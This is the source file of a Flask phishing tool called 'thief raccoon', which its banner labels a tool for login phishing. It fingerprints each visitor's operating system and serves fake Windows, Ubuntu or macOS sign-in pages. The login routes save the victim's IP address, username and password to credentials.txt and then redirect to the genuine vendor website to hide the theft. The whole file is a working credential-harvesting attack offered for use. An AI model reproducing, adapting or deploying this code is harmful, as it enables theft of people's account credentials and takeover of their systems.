from flask import Flask, request, render_template, redirect
from colorama import Fore, Style
import user_agents


app = Flask(__name__)

def display_banner():
    banner = """
              ▄▄▄▄▄▄▄▄
 ▄█▀███▄▄████████████████████▄▄███▀█
 █░░▀████████████████████████████░░█
  █▄░░▀████████████████████████░░░▄▀
   ▀█▄▄████▀▀▀░░░░██░░░▀▀▀█████▄▄█▀
   ▄███▀▀░░░░░░░░░██░░░░░░░░░▀███▄
  ▄██▀░░░░░▄▄▄██▄▄██░▄██▄▄▄░░░░░▀██▄
▄██▀░░░▄▄▄███▄██████████▄███▄▄▄░░░▀█▄
▀██▄▄██████████▀░███▀▀▀█████████▄▄▄█▀
  ▀██████████▀░░░███░░░▀███████████▀
    ▀▀▀██████░░░█████▄░░▀██████▀▀         Versio: 1.0.0
         ▀▀▀▀▄░░█████▀░▄█▀▀▀              Dev: @davenisc
              ▀▀▄▄▄▄▄▀▀                   Web: https://davenisc.com
 _______ _     _          ___    ______                                    
(_______) |   (_)        / __)  (_____ \                                   
    _   | |__  _ _____ _| |__    _____) )_____  ____ ____ ___   ___  ____  
   | |  |  _ \| | ___ (_   __)  |  __  /(____ |/ ___) ___) _ \ / _ \|  _ \ 
   | |  | | | | | ____| | |     | |  \ \/ ___ ( (__( (__| |_| | |_| | | | |
   |_|  |_| |_|_|_____) |_|     |_|   |_\_____|\____)____)___/ \___/|_| |_|
                                                                           
       
thief raccoon - Herramienta para Phishing de inicio de sesion
    """
    print(banner)


@app.route('/')
def detect_os():
    user_agent = request.headers.get('User-Agent')
    ua = user_agents.parse(user_agent)
    
    os_family = ua.os.family.lower()
    os_version = ua.os.version_string.lower()
    
    full_os_version = f"{os_family} {os_version}".lower()
    
    
    if 'windows 10' in full_os_version:
        return phishing_windows_10()
    elif 'windows 11' in full_os_version:       
        return phishing_windows_11()
    elif 'windows' in user_agent:
        return phishing_windows_10()
    elif 'Ubuntu' in user_agent:
        return phishing_ubuntu()
    elif 'ubuntu' in user_agent:
        return phishing_ubuntu()
    elif 'Linux' in user_agent:
        return phishing_ubuntu()
    elif 'Macintosh' in user_agent:
        return phishing_macos()
    else:
        return "Phishing para este sistema operativo no está disponible."
        

# WINDOWS 11
def phishing_windows_11():
    return render_template('username.html')

@app.route('/username', methods=['POST'])
def username():
    username = request.form['username']
    return render_template('password.html', username=username)

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    ip_address = request.remote_addr
    # Guardar los datos en un archivo
    with open('credentials.txt', 'a') as f:
        f.write(f'IP: {ip_address}, System: Windows 11, Username: {username}, Password: {password}\n')
    return redirect('https://www.microsoft.com/en-us/windows')

# WINDOWS 10

def phishing_windows_10():
    return render_template('username10.html')
    

@app.route('/username10', methods=['POST'])
def username10():
    username = request.form['username']
    return render_template('password10.html', username=username)

@app.route('/login10', methods=['POST'])
def login10():
    username = request.form['username']
    password = request.form['password']
    ip_address = request.remote_addr
    # Guardar los datos en un archivo
    with open('credentials.txt', 'a') as f:
        f.write(f'IP: {ip_address}, System: Windows 10, Username: {username}, Password: {password}\n')
    return redirect('https://www.microsoft.com/en-us/windows')

# UBUNTU

def phishing_ubuntu():
    return render_template('ubuntu.html')

@app.route('/usernameUbu', methods=['POST'])
def usernameUbu():
    username = request.form['username']
    return render_template('passwordUbu.html', username=username)

@app.route('/loginUbu', methods=['POST'])
def loginUbu():
    username = request.form['username']
    password = request.form['password']
    ip_address = request.remote_addr
    # Guardar los datos en un archivo
    with open('credentials.txt', 'a') as f:
        f.write(f'IP: {ip_address}, System: Ubuntu, Username: {username}, Password: {password}\n')
    return redirect('https://ubuntu.com/')

# MACOS

def phishing_macos():
    return render_template('macos.html')

@app.route('/usernameMac', methods=['POST'])
def usernameMac():
    username = request.form['username']
    return render_template('passwordMac.html', username=username)

@app.route('/loginMac', methods=['POST'])
def loginMac():
    username = request.form['username']
    password = request.form['password']
    ip_address = request.remote_addr
    # Guardar los datos en un archivo
    with open('credentials.txt', 'a') as f:
        f.write(f'IP: {ip_address}, System: Ubuntu, Username: {username}, Password: {password}\n')
    return redirect('https://www.apple.com/')


if __name__ == "__main__":
    display_banner()
    app.run(host='0.0.0.0', port=5000)
